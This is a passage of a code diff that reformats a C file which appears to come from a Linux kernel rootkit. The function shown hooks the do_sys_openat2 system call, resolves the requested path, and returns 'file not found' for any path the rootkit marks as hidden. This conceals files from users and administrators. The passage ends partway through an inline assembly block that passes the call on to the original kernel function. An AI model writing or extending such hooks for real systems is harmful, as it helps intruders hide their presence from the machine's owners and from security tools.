@@ -1,30 +1,30 @@
+#include "../inc/cmds.h"
 #include "../inc/hook.h"
 #include "../inc/util.h"
-#include "../inc/cmds.h"
 
 #include <linux/fs_struct.h>
-#include <linux/openat2.h>
 #include <linux/module.h>
-#include <linux/slab.h>
 #include <linux/namei.h>
+#include <linux/openat2.h>
+#include <linux/slab.h>
 
 void *_do_sys_openat2 = NULL;
 
-asmlinkage int64_t h_do_sys_openat2(int dfd, const char __user *filename, struct open_how *how){
-  int64_t ret = 0;
+asmlinkage int64_t h_do_sys_openat2(int dfd, const char __user *filename, struct open_how *how) {
+  int64_t     ret = 0;
   struct path path;
 
   hfind(_do_sys_openat2, "do_sys_openat2");
 
   // this call will only fail if the path does not exist
-  if(user_path_at(dfd, filename, LOOKUP_FOLLOW, &path) != 0)
+  if (user_path_at(dfd, filename, LOOKUP_FOLLOW, &path) != 0)
     goto end;
 
-  if(is_path_hidden(&path))
+  if (is_path_hidden(&path))
     ret = -ENOENT;
 
 end:
-  if(ret == 0)
+  if (ret == 0)
     asm("mov %1, %%r15;"
         "mov %2, %%edi;"
         "mov %3, %%rsi;"
